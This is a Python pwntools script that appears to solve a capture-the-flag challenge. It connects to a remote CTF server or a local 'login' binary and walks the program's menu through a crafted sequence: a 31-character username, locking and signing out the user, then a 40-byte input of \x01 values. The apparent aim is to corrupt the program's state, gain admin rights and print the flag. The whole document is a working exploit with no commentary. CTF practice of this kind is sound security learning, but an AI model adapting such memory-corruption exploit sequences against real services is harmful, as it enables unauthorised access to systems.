import pwn

host = "thekidofarcrania.com"
port = 13226
target = "./login" 


class Menu:

    def __init__(self, remote):
        if remote:
            self.pr = pwn.connect(host, port)
        else:
            self.pr = pwn.process(target)

    def login(self, name):
        self.pr.sendlineafter("> ", "1")
        self.pr.sendlineafter("Username: ", name)

    def sign_out(self):
        self.pr.sendlineafter("> ", "2")

    def print_flag(self, flag):
        self.pr.sendlineafter("> ", "3")
        line = self.pr.readline()
        if line.startswith(b"You are not admin."):
            self.pr.sendline(flag)
        else:
            print(line)
            print(self.pr.readline())

    def lock_user(self):
        self.pr.sendlineafter("> ", "4")

    def restore_user(self):
        self.pr.sendlineafter("> ", "5")


def exploit(remote):

    menu = Menu(remote)

    try:
        menu.login('A'*31)
        menu.lock_user()
        menu.sign_out()
        menu.print_flag(b'\x01'*40)
        menu.restore_user()
        menu.print_flag("")
    except Exception as ex:
        print(ex)
    finally:
        menu.pr.close()

exploit(True)